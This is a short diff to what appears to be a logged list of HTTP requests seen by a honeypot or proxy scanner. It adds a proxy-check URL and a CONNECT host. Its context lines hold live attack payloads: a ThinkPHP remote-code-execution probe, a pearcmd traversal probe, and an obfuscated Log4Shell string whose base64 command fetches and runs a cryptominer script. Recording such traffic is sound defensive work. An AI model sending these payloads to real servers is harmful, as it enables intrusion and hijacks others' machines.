@@ -462,6 +462,7 @@ method GET url /index.php?s=index/index/index/think_lang/../../extend/pearcmd/pe
 method GET url /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello
 method GET url /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//95.214.55.202:3306/TomcatBypass/Command/Base64/a2lsbGFsbCAtOSBwYXJhaXNvLng4Njsga2lsbGFsbCAtOSB4bXJpZzsgY3VybCAtcyAtTCBodHRwOi8vZG93bmxvYWQuYzNwb29sLm9yZy94bXJpZ19zZXR1cC9yYXcvbWFzdGVyL3NldHVwX2MzcG9vbF9taW5lci5zaCB8IExDX0FMTD1lbl9VUy5VVEYtOCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO%7D%27%29
 method GET url http://azenv.net/
+method GET url http://azenv.net/url?key=xxx
 method GET url http://httpbin.org/ip
 method GET url http://www.google.com
 method GET url http://5.188.210.227/echo.php
@@ -621,6 +622,7 @@ method CONNECT url rev.pm:443
 method CONNECT url api.rev.pm:443
 method CONNECT url github.com:443
 method CONNECT url v4.ident.me:443
+method CONNECT url ecaravan.gr:443
 method CONNECT url zaloweb.ink:443
 method CONNECT url google.com:443
 method CONNECT url www.google.com:80
